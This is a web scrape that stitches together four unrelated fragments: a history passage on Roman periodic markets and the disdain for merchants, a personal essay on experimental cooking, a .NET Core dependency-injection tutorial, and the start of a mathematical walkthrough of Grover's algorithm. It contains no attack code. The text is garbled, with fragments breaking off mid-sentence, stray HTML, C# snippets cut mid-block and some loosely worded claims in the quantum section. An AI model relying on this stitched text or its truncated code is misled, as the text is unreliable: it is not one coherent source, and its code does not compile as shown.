<p>That leaves Options II, III and IV, all of which involve selling grain to a middle-man merchant of some sort.  The main difference is the location of sale (in town, at the gate, or at periodic rural markets).  Outside of large cities and major ports, markets were likely to be <em>periodic</em>, occurring only on certain days (typically around once per week).  In Roman Italy, these were the <em>nundinae</em> (‘ninth days,’ although it was an 8-day cycle as the Romans count inclusively); the <em>nundinae</em> were minor festivals, days of rest and merrymaking, but they were also the days when the rural markets would be open – the rest-day from agricultural labor enabled farmers to head into local towns to buy or sell whatever they needed (interestingly, at Rome, the <em>nundinae</em> were <em>dies nefasti</em> – state business couldn’t generally be conducted on them – so poor farmers hoping to use their day off to participate politically were out of luck).  Similar periodic markets are common in the Middle Ages (and even today; most ‘farmer’s markets’ in the United States are periodic, <a href="http://www.carrborofarmersmarket.com/">including my town’s</a>).  The periodic nature of these markets is an adaptation to agricultural rhythms; for a market to function there need to be a lot of people together all at once and the small towns that dotted the countryside simply didn’t have the density to do that all of the time.</p>

Please note: the importance of pottery in modern archaeology has given many students and the general public the idea that the ancients were always shipping pots around for sale, as if there was a vast market in pottery.  <strong>Generally, people were buying what was in the pot, not the pot itself</strong>.</figcaption></figure>



<p>But as noted, our farmers are unlikely to be selling their grain directly to customers.  Instead, they are likely to be using some sort of middle-man merchant, which brings us to:</p>



<h2>Merchants!</h2>



<p>Merchants are a bit of a break from the people we have so far discussed in that they, by definition, live in the realm of the <em>market</em> (in the economic sense, although often also in a physical sense).  As we’ve seen so much of the world of our farmers and even our millers and bakers was governed by <em>non-market</em> interactions: horizontal and vertical social ties that carried expectations that weren’t quite transactional and certainly not monetized.  By contrast, merchants work with transactions and tend to be the <em>first</em> group in any society to attempt to monetize their operations once money becomes available.  I find students are often quick to feel identity with the merchant class, because these folks are more likely to travel, more likely to use money, more likely to employ or be employed in wage-labor; they feel more like modern people.</p>



<p>It thus tends to come as something of a surprise that with <em>stunning</em> consistency, <strong>the merchant class tended to be at best cordially disliked and at worst <em>despised</em> by the broader community</strong> (although not typically to the point of suffering legal disability, as did some other jobs; see S. Bond, <em>Trade and Taboo: Disreputable Professions in the Roman Mediterranean</em> (2016) for this in Rome).  This often strikes students as strange, both because we tend to think rather better of our own modern merchants but also because the image they have of the merchant class certainly looks elite.</p>

<p>For the farmers who need to sell their crops (for reasons we will get to in a moment) and purchase the things they need that they cannot produce, the merchant feels like an adversary: always pushing his prices to his best advantage.  We expect this, but remember that our pre-modern farmers are just <em>not that exposed to market interactions</em>; most of their relationships are reciprocal, not transactional – the horizontal relationships we discussed before.  The merchant’s ‘money-grubbing’ feels like a betrayal of trust in a society where you banquet your neighbors in the good years so they’ll help you in the bad years.  <strong>The necessary function of a merchant is to transgress the ‘rules’ of village interactions which – and this <em>resounds</em> from the sources – the farmers tend to understand as being ‘cheated.’</strong></p>



<p>At the same time, <strong>while most merchant types are humble, the high-risk and potentially high-reward involved in trade meant that <em>some</em> merchants </strong>(again, a small number) <strong>could become <em>very</em> rich</strong>.  That, as you might imagine, <strong>did not go over well for the traditionally wealthy in these societies</strong>, the large landholders.  Again, the values here often strike modern readers as topsy-turvy compared to our own, but to the elite large landholders (who dominate the literary and political culture of their societies), the <em>morally correct</em> way to earn great wealth is to inherit it (or capture it in war).  The <em>morally correct</em> way to hold that wealth is with large landed estates.  Anything else is <em>morally</em> suspect, and so the idea that a successful merchant could – by a process that again, strikes the large landholder, just like the small farmer, as ‘cheating’ – leap-frog the social pyramid and skip to the top, without putting in the work at either having distinguished wealthy ancestors <em>or</em> tremendous military success was an open insult to elite values.  Often laws were put in place to limit the ability of wealthy non-aristocrats (likely merchants or successful artisans) from displaying their wealth (<a href="https://en.wikipedia.org/wiki/Sumptuary_law">sumptuary laws</a>) so as to keep them from competing with the aristocrats; at Rome, senators were forbidden from owning ships with much the same logic (Roman senators being clever, they still invested in trade through proxies while at the same time disapproving of the activity in public politics).</p>



<p>Such disdain appears, with varying justification, in the sources of every pre-modern agrarian society I’ve studied, to one degree or another.  One commonplace of Greek and Roman thinking – despite these being very active, maritime societies – was that the first production of ships and the first sailing was in some essential way a profanation of the divine realm of the sea, a space humans ought not have ever ventured into – and certainly not for anything as mean as profit (e.g. Euripides, <em>Medea</em> 1-6; Catullus. 64.1-20; Valerius Flaccus, <em>Argonautica</em> 627-632; Seneca, <em>Medea</em> 1-12; 301-379, <em>inter alia</em> – thanks to my old grad school pals <a href="https://www.usf.edu/arts-sciences/departments/world-languages/about-us/hedrick.aspx">Buddy Hedrick</a> and <a href="http://gdrsd.org/gdrhs/faculty/michael-hoffman/">Michael Hoffman </a>for …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>I am amateur cook with sloppy form. And I don't plan on ever becoming a pro.</span></p> <p><span>Cooking to me is not about creating the best tasting dish in the world. Rather, it is an outlet of expression, a means to evoke sensations. </span></p> <p><span>In this article, I share my </span> <em>life-long pursuit of joy</em> <span> in my home kitchen.</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/sushi%20ice%20cream.png"></p> <p><em>Sushi Ice Cream: Salmon neta on rice ice cream</em></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/cooking-burdock.png"></p> <p><em>Ox Tail, with Variations of Burdock Roots</em></p>  <p><h2><span>Total Work of Art</span></h2></p> <p><span>Food is the </span> <strong>fullest form of art</strong> <span> to me
. It engages all your senses: its look, smell, taste, temperature, texture, the sound it makes when you cook/eat it, and the bodily feelings it leaves you with.</span></p> <p><span>A well-executed dish triggers a </span> <em>constellation of inter-related physical and emotional sensations</em> <span> that are too complex to put into words. And its transient nature only adds poetic beauty to it
. </span> <em>You savour the moment until it vanishes</em> <span>.</span></p>  <p><h2><span>The Science &amp; Experimentation
</span></h2></p> <p><span>Cooking is also a science. It is a repeatable process that allows for accumulation of knowledge, through experimentation and diligent documentation. Learning the fundamentals and theory of cooking satisfies the nerdy side of me. And thanks to our collective knowledge amassed over generations, we can reliably create great-tasting foods. </span></p> <p><span>Many cooks use the word "experimental" to describe
: </span></p> <p><li><span>Trying a new known recipe  
</span></li></p> <p><li><span>Cooking without a recipe, but sticking with what has worked well in the past
</span></li></p> <p><span>But being experimental means </span> <em>something different</em> <span> to me. My goal is not 
to make food that tastes good. </span> <em>Discovery</em> <span> is what I am really after.</span></p>  <p><h2><span>Fun + Discovery &gt; Taste</span></h2></p> <p><span>What motivates me in the kitchen is not the outcome of the experiment, but that I </span> <strong>have fun playing</strong> <span> and that I walk away with a </span> <strong>new discovery</strong> <span>. </span></p> <p><span>The "success" of a dish matters much less than the process of trying. It is not the outcome of this particular instance of the dish that appeals to me. But rather the abstract idea that I start with, and having it meet with reality.</span></p> <p><span>In that regard, the anime/manga series "Shokugeki no Soma" ("Food Wars") resonates with me very much
. It's not for everyone, but it's the closest to describing how I feel towards food.</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/seaweed-icecream.png"></p> <p><em>Nori ice cream, with quite a bit of MSG. I liked it. But others said it was weird...</em></p>  <p><h2><span>Alchemy — When Ingredients Are Transformed</span></h2></p> <p><span>My most joyful moments in the kitchen are when </span> <em>seemingly unrelated ingredients</em> <span> (or processes) work together to deliver </span> <em>surprising outcomes</em> <span>. </span></p> <p><span>The process feels like </span> <strong>alchemy</strong> <span> — watching ingredients transform, using a variety of unusual flavour combinations, processing and aging techniques. Finding a new peak on the vast landscape of possible dining experiences.
 Tricking the brain into perceiving ingredients that aren't there
. It is immensely satisfying.
</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/banana%20paste.png"></p> <p><em>Blackened, lacto-fermented banana </em> <span>purée. </span> <em>It looks and takes like preserved olives, only much more interesting.</em> <span> 
﻿</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/scallop.png"></p> <p><em>Lacto-fermented oyster mushrooms, torched. Looks and tastes like scallop, with an added funk.</em></p>  <p><span>I love experimental cooking, for the marriage of art and science. Traditions and 
discovery. Play and chores. </span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The objective of this post is to configure and use Microsoft’s default dependency injection container from scratch to understand how it all hangs together when in action. There are many other great articles explaining Dependency Injection and Inversion of Control (DI &amp; IoC from now on) in ASP.NET Core out there. This article assumes that you understand those principles. So I will not be covering those.</p>
<p>We will start with a simple console application, configure an IoC container, and have some fun with it by diving into the .NET Core DI Extensions’ source code.</p>
<blockquote>
<p>💡 Follow along with the code from my <a href="https://github.com/sahan91/dotnet-ioc-example">repository</a></p>
</blockquote>
<h3>Microsoft’s IoC Container in .NET Core</h3>
<p>The .NET Core IoC container is located in <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.dependencyinjection?view=dotnet-plat-ext-3.1">Microsoft.Extensions.DependencyInjection</a> namespace.  Let’s look at what are the steps involved in order to use this in our application.</p>
<ol>
<li>We need to add this assembly via NuGet.</li>
<li>Types must be registered with <code>ServiceCollection</code></li>
<li>Types are retrieved from <code>ServiceProvider</code></li>
</ol>
<p>We will start off with a simple console application and see how we can achieve the above steps.</p>
<h3>Setup</h3>
<p>Let’s start by creating a console application.</p>
<div data-language="bash"><pre><code>dotnet new console -n IoCTutorial
dotnet new sln
dotnet sln <span>add</span> IoCTutorial</code></pre></div>
<p>Open it up in your favourite IDE and you are ready to follow along. I won’t be using any other dependency (such as logging) just to keep this tutorial simple.</p>
<p>Let’s go ahead and add the DI assembly from NuGet.</p>
<div data-language="bash"><pre><code>dotnet <span>add</span> package Microsoft.Extensions.DependencyInjection</code></pre></div>
<p>Your project structure should now look like this.</p>
<p><span>
      <span></span>

    </span></p>
<p>Let’s add two classes into our project; <a href="https://github.com/sahan91/dotnet-ioc-example/blob/master/IoCTutorial/MyService.cs">MyService</a> and <a href="https://github.com/sahan91/dotnet-ioc-example/blob/master/IoCTutorial/MyDependency.cs">MyDependency</a>. Here’s what’s gonna go into those two classes.</p>
<p> <code>MyService.cs</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyService</span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>MyDependency</span> _myDependency<span>;</span>
    <span>public</span> <span>MyService</span><span>(</span><span>MyDependency</span> myDependency<span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyService"</span><span>)</span><span>;</span>
        _myDependency <span>=</span> myDependency<span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span>
    <span>{</span>
        _myDependency<span>.</span><span>DoWork</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p><code>MyDependency.cs</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyDependency</span>
<span>{</span>
    <span>public</span> <span>MyDependency</span><span>(</span><span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyDependency"</span><span>)</span><span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoWork</span><span>(</span><span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Doing some work in MyDependency"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>As we can see, <code>MyService</code> has an (aptly named 😅 ) dependency on <code>MyDependency</code>. In order to invoke our service, we need to pass an instance of the required dependency into its constructor. In our driver code (Program.cs) without any IoC stuff, we could do something like this.</p>
<div data-language="csharp"><pre><code><span><span>var</span></span> myService <span>=</span> <span>new</span> <span>MyService</span><span>(</span><span>new</span> <span>MyDependency</span><span>(</span><span>)</span><span>)</span><span>;</span>
myService<span>.</span><span>DoSomething</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>This is baaaaad 💀. Problem with this is, now we are responsible for managing the dependencies, their lifetimes (and also violates SOLID principles) etc. Let’s fix this by using the IoC container. We will simply give them a scoped lifetime.</p>
<div data-language="csharp"><pre><code>
<span><span>var</span></span> container <span>=</span> <span>new</span> <span>ServiceCollection</span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>


<span><span>var</span></span> provider <span>=</span> container<span>.</span><span>BuildServiceProvider</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>If you aren’t familiar with service lifetimes, it’s best if you refer to the <a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1#service-lifetimes">official documentation</a> before continuing on.</p>
<blockquote>
<p>💡 Note that you don’t have to instantiate ServiceCollection in an ASP.NET Core Web or Worker Service application. You would ideally register your services using the IServiceCollection in the Startup class.</p>
</blockquote>
<h3>The quick &amp; dirty service registration</h3>
<p>Once we have set this up, we need to call <code>BuildServiceProvider</code> method on the container. This returns us a <code>ServiceProvider</code> as a result. Remember that we first need to register our types in the container (<code>ServiceCollection</code>) and then retrieve them using the provider. Bear with me on this one as we are using the concrete implementations rather than interfaces for this initial cut.</p>
<div data-language="csharp"><pre><code>
<span><span>var</span></span> myService <span>=</span> provider<span>.</span><span><span>GetService</span><span><span>&lt;</span>MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
myService<span>.</span><span>DoSomething</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Now when we run this, it should create an instance of <code>MyDependency</code>, construct an instance of <code>MyService</code> and run the <code>DoSomething()</code> method.</p>
<p><span>
      <span></span>
  <img alt="dotnet-core-ioc-container-3.png" title="dotnet-core-ioc-container-3.png" src="https://sahansera.dev/static/52d70b184e7aa00a5b603b35eeb953b4/5a190/dotnet-core-ioc-container-3.png" srcset="https://sahansera.dev/static/52d70b184e7aa00a5b603b35eeb953b4/772e8/dotnet-core-ioc-container-3.png 200w,

    </span></p>
<p>Notice how we never constructed <code>MyDependency</code> because the DI framework resolved it and did the constructor injection for us. Nice!</p>
<h3>Internals of ServiceCollection and ServiceProvider</h3>
<p>Looking at our code, the <code>ServiceCollection</code> holds a bunch of <code>ServiceDescriptor</code>s and provides some utility methods to manipulate it. <code>ServiceDescriptor</code>s are really the objects that describe (type, implementation, lifetime etc.) our service registrations.</p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>ServiceCollection</span> <span>:</span> <span><span>IServiceCollection</span></span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>List<span>&lt;</span>ServiceDescriptor<span>&gt;</span></span> _descriptors <span>=</span> <span>new</span> <span>List<span>&lt;</span>ServiceDescriptor<span>&gt;</span></span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span><span>int</span></span> Count <span>=&gt;</span> _descriptors<span>.</span>Count<span>;</span>
    <span>public</span> <span><span>bool</span></span> IsReadOnly <span>=&gt;</span> <span>false</span><span>;</span>

    <span>public</span> <span>ServiceDescriptor</span> <span>this</span><span>[</span><span><span>int</span></span> index<span>]</span>
    <span>{</span>

<p>In the subsequent sections, we will look at how it gets utilised.</p>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.dependencyinjection.servicecollectionserviceextensions.addscoped?view=dotnet-plat-ext-3.1"><code>AddScoped</code></a> (and other service registration extension methods) method just adds our service registration (as a ServiceDescriptor) into the above <code>_descriptors</code> list.</p>
<p>Looking at <a href="https://github.com/dotnet/runtime/blob/60eff3f3766631bd4e7ee256ca17619fec90e9e6/src/libraries/Microsoft.Extensions.DependencyInjection/src/ServiceCollectionContainerBuilderExtensions.cs#L49">the internals</a> of the <code>BuildServiceProvider</code> extension method, we can see that it actually instantiates a new service provider with our given service registrations. As we saw earlier these service registrations are passed in as a <code>ServiceCollection</code> and if you put debug this, you will be able to see the following: </p>

<p>If you are interested, one observation I made was to get an idea of <em>when</em> it actually instantiates our types. In our Program.cs if you update it as below,</p>
<div data-language="csharp"><pre><code><span><span>var</span></span> provider <span>=</span> container<span>.</span><span>BuildServiceProvider</span><span>(</span><span>)</span><span>;</span>

    </span></p>
<p>See the dotted line before “Doing some work in MyDependency”? I initially thought that these types would have been constructed when we built the service provider. However, it seems that they are instantiated when we call <code>provider.GetService&lt;MyService&gt;();</code> instead. This should, however, not to be confused with service lifetimes in an ASP.NET Core web application where service lifetimes play a major role in the request pipeline.</p>
<blockquote>
<p>💡 The IoC container will instantiate our implementation types when the GetService<t>() method is called, not when the IoC container is built.</t></p>
</blockquote>
<p>Looking at the implementation of the <code>ServiceProviderEngine</code>’s code you will see that the data structure that holds all our type registrations is really a <code>ConcurrentDictionary</code>. If you drill down in the call chain of <code>GetService</code> far enough, you would come across the following class in the <a href="https://github.com/dotnet/runtime/blob/907f7da59b40c80941b02ac2a46650adf3f606bc/src/libraries/Microsoft.Extensions.DependencyInjection/src/ServiceLookup/CallSiteValidator.cs#L14">source of DI extensions</a>.</p>
<p>So, we have an idea of how we can register services in the IoC container. Nevertheless, this can still be improved by mapping interfaces rather than using concrete classes. We will look at it in the next section.</p>
<h3>Replacing Concrete Classes with Interfaces</h3>
<p>Let’s extract interfaces for <code>MyService</code> and <code>MyDependency</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>interface</span> <span>IMyService</span>
<span>{</span>
    <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="csharp"><pre><code><span>public</span> <span>interface</span> <span>IMyDependency</span>
<span>{</span>
    <span><span>void</span></span> <span>DoWork</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Nothing interesting here. Let’s just implement these two interfaces in their corresponding classes. </p>
<p>Our <code>MyService</code> will now use the interface instead of the concrete class.</p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyService</span> <span>:</span> <span><span>IMyService</span></span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>IMyDependency</span> _myDependency<span>;</span>
    
    <span>public</span> <span>MyService</span><span>(</span><span>IMyDependency</span> myDependency<span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyService"</span><span>)</span><span>;</span>
        _myDependency <span>=</span> myDependency<span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span>
    <span>{</span>
        _myDependency<span>.</span><span>DoWork</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>In our Program.cs, we will update the following lines to use the abstractions instead of concrete classes,</p>
<div data-language="csharp"><pre><code>container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyService<span>,</span> MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Now when we run the application, we will get the same result. However, to make things interesting, let’s add another <code>MyDependency</code> class that implements <code>IMyDependency</code> interface. Without spending too much time on a name, let’s name that <code>MyDependency2</code> and register it in the IoC container.</p>
<div data-language="csharp"><pre><code>container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency2<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span> 
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyService<span>,</span> MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>What do we get now?</p>
<p><span>
      <span></span>

    </span></p>
<p>It’s no longer using <code>MyDependency</code>, but using <code>MyDependency2</code> instead.</p>
<blockquote>
<p>💡 Remember, if you add multiple concrete implementations for the same interface, it will always pick up the last one that got registered, by default.</p>
</blockquote>
<h3>Unravelling why we get the last registered implementation type</h3>
<p>So, how do we register multiple implementations for the same service type? It’s not supported as you might already know or have come across this <a href="https://github.com/aspnet/DependencyInjection/issues/360">discussion on Github</a>. Looking at the internals of the <code>GetService()</code> method we can uncover why this happens.</p>
<p>If you debug the <code>ServiceCollection</code>, you will be able to see that our two implementation types for <code>IMyDependency</code> are still there.</p>

<p>So there has to be something in the call stack which hands over the last registered implementation type to the service provider.

      <h3 id="introduction">Introduction</h3>

<p>Grover’s algorithm is a quantum computing algorithm invented to search from <strong>unstructured</strong> database using less than $O(\sqrt{N})$ queries. Comparing to $O(N)$ which is the best asymptotical complexity that a classical search algorithm could achieve for unstructured database, Grover’s algorithm is significantly better.</p>



<p>In this blog post, I would like to discuss Grover’s algorithm and its caveats in details.</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>From the <a href="https://leimao.github.io/blog/Simon-Algorithm/">property of Hadamard operator</a>, we have already known that</p><p>

\[\begin{align}
H^{\otimes {n}} | \mathbf{0} \rangle &amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>We denote it using $| \mathbf{s} \rangle$ for our convenience.</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>The following equation would be useful for this article.</p><p>

\[\begin{align}
2 | \mathbf{s} \rangle \langle \mathbf{s} | - I &amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \otimes_{\text{outer}} \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) - I \\
&amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big)^{\dagger} - I \\
&amp;= 2 H^{\otimes {n}} | \mathbf{0} \rangle | \mathbf{0} \rangle^{\dagger}  H^{\otimes {n} \dagger} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - H^{\otimes {n}} I H^{\otimes {n}} \\
&amp;= H^{\otimes {n}} \big(2 | \mathbf{0} \rangle \langle \mathbf{0} | - I \big) H^{\otimes {n}} \\
\end{align}\]

</p><p>where $| \mathbf{s} \rangle \langle \mathbf{s} |$ is the outer product of $| \mathbf{s} \rangle$ and $| \mathbf{s} \rangle$ and the $\otimes_{\text{outer}}$ is the outer product. Note that outer product $\otimes_{\text{outer}}$ is a little bit different from Kronecker product which we have used $\otimes$ to denote in the previous articles.</p>



<p>Let’s check what $| \mathbf{s} \rangle \langle \mathbf{s} |$ is.</p><p>

\[\begin{align}
| \mathbf{s} \rangle \langle \mathbf{s} | &amp;= \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \otimes_{\text{outer}} \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \otimes_{\text{outer}} | \mathbf{y} \rangle \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \langle \mathbf{y} | \\
&amp;= \frac{1}{2^n} 
\begin{bmatrix} 
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    \vdots &amp; \vdots &amp; \vdots &amp; \vdots \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
\end{bmatrix}_{2^n \times 2^n} \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>where $J$ is the unit matrix.</p>



<p>We further define matrix $A$</p><p>

\[\begin{align}
A &amp;= | \mathbf{s} \rangle \langle \mathbf{s} | \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>We would like to further show that matrix $2A - I$ is unitary.</p>



<p>It is trivial to see that $A^{\dagger} = A$, therefore, $(2A - I)^{\dagger} = 2A - I$. Because</p><p>

\[\begin{align}
(2A - I)^{\dagger} (2A - I) &amp;= (2A - I) (2A - I)^{\dagger} \\
&amp;= (2A - I)^2 \\
&amp;= 4A^2 - 4A + I \\
&amp;= \frac{4}{2^{2n}} 2^n J_{2^n \times 2^n} - \frac{4}{2^n} J_{2^n \times 2^n} + I \\
&amp;= 0 + I \\
&amp;= I \\
\end{align}\]

</p><p>This concludes the proof that $2A - I$ is unitary.</p>



<p>In addition, $2A - I$ is actually an reflection matrix that could reflect the vector $| \mathbf{x} \rangle$ about $| \mathbf{s} \rangle$.</p><p>

\[\begin{align}
| \mathbf{x}^{\prime} \rangle&amp;= (2A - I) | \mathbf{x} \rangle \\
&amp;= (2 | \mathbf{s} \rangle \langle \mathbf{s} | - I) | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s} | | \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle ( \langle \mathbf{s} | | \mathbf{x} \rangle ) - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s}, \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 \langle \mathbf{s}, \mathbf{x} \rangle | \mathbf{s} \rangle - | \mathbf{x} \rangle \\
\end{align}\]

</p><p>Typically, given a normalized unit vector $\mathbf{n}$, and a vector $\mathbf{x}$, the reflected vector of vector $\mathbf{x}$ about $\mathbf{n}$ is</p><p>

\[\mathbf{x}^{\prime} = 2 \langle \mathbf{n}, \mathbf{x} \rangle \mathbf{n} - \mathbf{x}\]

</p><p>This is high-school math. If the reader forgot how to understand this, please refer to the blog post <a href="http://paulbourke.net/geometry/reflected/">“Calculating the Reflected Ray”</a>.</p>



<p>This concludes the proof that $2A - I$ is a reflection matrix about $| \mathbf{s} \rangle$.</p>

<h3 id="identity-search-problem">Identity Search Problem</h3>

<p>Suppose we have an array of items $\{v_0, v_1, \cdots, v_{n-1}\}$, and we would like to find a target item $v_g$ to find from the array. Using a classical algorithm, we have to go through the entire array, that is we retrieve items one by one from the array and compare them against the target item. The asymptotic complexity for the worst case and the average case are both $O(n)$.</p>



<p>It seems that $O(n)$ is the best we could do for a search problem using a classical algorithm. How could we know where is target item is in the array without going through the entire array? However, using a quantum algorithm, we would be able to complete a search in $O(\sqrt{n})$. In the next sections, we would see how we could achieve this.</p>



<p>Suppose all the items are distinct and there is only one item matching the query, the search problem could be modeled using a given function $f: \{0,1\}^n \rightarrow \{0,1\}$, and we are assured that there exits exactly one binary string $\mathbf{x}^\ast$, such that</p><p>

\[\begin{align}
f(\mathbf{x}) &amp;= 
    \begin{cases}
      1 &amp; \text{when $\mathbf{x} = \mathbf{x}^\ast$}\\
      0 &amp; \text{when $\mathbf{x} \neq \mathbf{x}^\ast$}\\
    \end{cases} 
\end{align}\]

</p><p>The search problem is converted to find $\mathbf{x}^\ast$.</p>

    <figcaption>Quantum Oracle Circuit</figcaption>
</figure>
</div>

<p>This quantum oracle circuit has been well discussed in my previous article on <a href="https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/">Deutsch-Jozsa algorithm</a>. We have known that</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= (-1)^{f(\mathbf{x})} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

</p><p>If the top input qubits to $U_f$ is an equal superposition, i.e.,</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>what will the top output qubits be?</p>



<p>Because we have assumed that there is only one $\mathbf{x} = \mathbf{x}^\ast$, such that $f(\mathbf{x}) = 1$, and for $\mathbf{x} \neq \mathbf{x}^\ast$ we have $f(\mathbf{x}) = 0$,</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} (-1)^{0} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) + \frac{1}{\sqrt{2^n}} (-1)^{1} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} \frac{1}{\sqrt{2^n}} |\mathbf{x}\rangle - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \Bigg) \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

